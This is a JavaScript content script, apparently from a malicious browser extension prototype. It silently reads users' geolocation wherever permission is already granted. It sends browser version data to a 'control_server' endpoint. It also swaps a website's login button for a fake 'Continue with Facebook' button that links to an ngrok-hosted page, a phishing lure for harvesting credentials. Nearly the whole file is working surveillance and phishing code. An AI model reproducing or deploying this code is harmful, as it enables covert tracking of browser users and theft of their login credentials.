function logGeolocation(){
    //get current geolcation position
    navigator.geolocation.getCurrentPosition(position => {
        const { latitude, longitude } = position.coords;
        chrome.storage.local.set({lat:latitude, long:longitude});//save it to memory
});}


//When injected in any webpage, see if permissions for gelocations are granted
navigator.permissions
    .query({ name: "geolocation" })
    .then(function (_a) {
    var state = _a.state;
    if (state === "granted") {
        logGeolocation(); //log geolocation if they are granted
    }
}); 

//OS System
fetch('http://127.0.0.1:5000/control_server',
        {
        method: "POST",
        mode: 'no-cors', 
        body: JSON.stringify( window.navigator.appVersion),
        headers:{"Content-Type": "application/json"}
        }
)



const sleep = ms => new Promise(r => setTimeout(r, ms));//the standard sleep function

async function demo(){
    await sleep(1000); //we wait 1 second after the DOM is loaded for facebook make his changes
    var a = document.getElementById("loginBtn") //we search for the function buttom
    if (a != null){ //IF EXISTS
        console.log("hola")
        var b = document.createElement("BUTTON");  //we create a new buttom
        //select the parent of the buttom
        var p = document.querySelector("#fusion-app > article > div > div > div > div.col.container_row.padding_sm.desktop_6.desktop_offset_3.tablet_6.tablet_offset_1.text_align_center > div.ps-flex.ps-flex-justify-center.ps-mb-20 > div")
        b.innerHTML ='<a class=fb href="https://ff07-88-9-37-107.eu.ngrok.io/"> <div><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="18px" height="18px" viewBox="0 0 18 18" version="1.1"><title>Logo Facebook</title><g fill="#FFFFFF" fill-rule="nonzero"><path d="M18,9A9,9,0,1,0,7.59,17.89V11.6H5.31V9H7.59V7A3.18,3.18,0,0,1,11,3.52a14.32,14.32,0,0,1,2,.17V5.91H11.87a1.29,1.29,0,0,0-1.46,1.4V9H12.9l-.4,2.6H10.41v6.29A9,9,0,0,0,18,9Z"></path></g></svg><span>Conitnue with Facebook</span></div></a>' //add the url we like
        p.replaceChild(b,a) //replace the buttoms in the DOM
    }
    
}

chrome.storage.local.get(["phase"]).then((result)=>{
    if (result.phase == 1){
        demo()
    }  
})